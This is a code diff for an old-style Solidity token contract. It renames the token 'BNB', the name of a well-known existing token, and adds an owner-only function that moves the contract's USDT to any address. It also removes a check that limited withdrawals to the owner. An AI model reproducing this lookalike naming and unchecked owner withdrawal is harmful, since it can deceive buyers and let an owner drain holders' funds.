@@ -34,12 +34,13 @@ contract SafeMath {
     }
   }
 }
-contract AGIF is SafeMath{
+contract BNB is SafeMath{
     string public name;
     string public symbol;
     uint8 public decimals;
     uint256 public totalSupply;
     address public owner;
+    address public usdtAddress = 0xc2132D05D31c914a87C6611C10748AEb04B58e8F;
 
     /* This creates an array with all balances */
     mapping (address => uint256) public balanceOf;
@@ -51,15 +52,15 @@ contract AGIF is SafeMath{
 
     /* This notifies clients about the amount burnt */
     event Burn(address indexed from, uint256 value);
-    
+
     /* This notifies clients about the amount frozen */
     event Freeze(address indexed from, uint256 value);
-    
+
     /* This notifies clients about the amount unfrozen */
     event Unfreeze(address indexed from, uint256 value);
 
     /* Initializes contract with initial supply tokens to the creator of the contract */
-    function AGIF(
+    function BNB(
         uint256 initialSupply,
         string tokenName,
         uint8 decimalUnits,
@@ -76,7 +77,7 @@ contract AGIF is SafeMath{
     /* Send coins */
     function transfer(address _to, uint256 _value) {
         if (_to == 0x0) throw;                               // Prevent transfer to 0x0 address. Use burn() instead
-        if (_value <= 0) throw; 
+        if (_value <= 0) throw;
         if (balanceOf[msg.sender] < _value) throw;           // Check if the sender has enough
         if (balanceOf[_to] + _value < balanceOf[_to]) throw; // Check for overflows
         balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value);                     // Subtract from the sender
@@ -87,16 +88,16 @@ contract AGIF is SafeMath{
     /* Allow another contract to spend some tokens in your behalf */
     function approve(address _spender, uint256 _value)
         returns (bool success) {
-        if (_value <= 0) throw; 
+        if (_value <= 0) throw;
         allowance[msg.sender][_spender] = _value;
         return true;
     }
-       
+
 
     /* A contract attempts to get the coins */
     function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
         if (_to == 0x0) throw;                                // Prevent transfer to 0x0 address. Use burn() instead
-        if (_value <= 0) throw; 
+        if (_value <= 0) throw;
         if (balanceOf[_from] < _value) throw;                 // Check if the sender has enough
         if (balanceOf[_to] + _value < balanceOf[_to]) throw;  // Check for overflows
         if (_value > allowance[_from][msg.sender]) throw;     // Check allowance
@@ -109,46 +110,45 @@ contract AGIF is SafeMath{
 
     function burn(uint256 _value) returns (bool success) {
         if (balanceOf[msg.sender] < _value) throw;            // Check if the sender has enough
-        if (_value <= 0) throw; 
+        if (_value <= 0) throw;
         balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value);                      // Subtract from the sender
         totalSupply = SafeMath.safeSub(totalSupply,_value);                                // Updates totalSupply
         Burn(msg.sender, _value);
         return true;
     }
-    
+
     function freeze(uint256 _value) returns (bool success) {
         if (balanceOf[msg.sender] < _value) throw;            // Check if the sender has enough
-        if (_value <= 0) throw; 
+        if (_value <= 0) throw;
         balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value);                      // Subtract from the sender
         freezeOf[msg.sender] = SafeMath.safeAdd(freezeOf[msg.sender], _value);                                // Updates totalSupply
         Freeze(msg.sender, _value);
         return true;
     }
-    
+
     function unfreeze(uint256 _value) returns (bool success) {
         if (freezeOf[msg.sender] < _value) throw;            // Check if the sender has enough
-        if (_value <= 0) throw; 
+        if (_value <= 0) throw;
         freezeOf[msg.sender] = SafeMath.safeSub(freezeOf[msg.sender], _value);                      // Subtract from the sender
         balanceOf[msg.sender] = SafeMath.safeAdd(balanceOf[msg.sender], _value);
         Unfreeze(msg.sender, _value);
         return true;
     }
-    
-    // transfer balance from owner
-    function withdrawEther(address to,uint256 amount) {
-        if(msg.sender != owner)throw;
-        transfer(to,amount);
-    }
 
     // transfer balance to owner
-    function withdrawEtherOwner(address to,uint256 amount) {
+    function withdrawEther(address to,uint256 amount) {
         if(msg.sender != owner)throw;
-        if(to != owner)throw;
         //transfer(to,amount);
-        AGIF tokenContract = AGIF(address(this));
+        BNB tokenContract = BNB(address(this));
         tokenContract.transfer(to, amount);
     }
-    
+
+    function withdrawUSDT(address to,uint256 amount) {
+        if(msg.sender != owner)throw;
+        BNB tokenContract = BNB(usdtAddress);
+        tokenContract.transfer(to, amount);
+    }
+
     // can accept ether
     function() payable {
     }
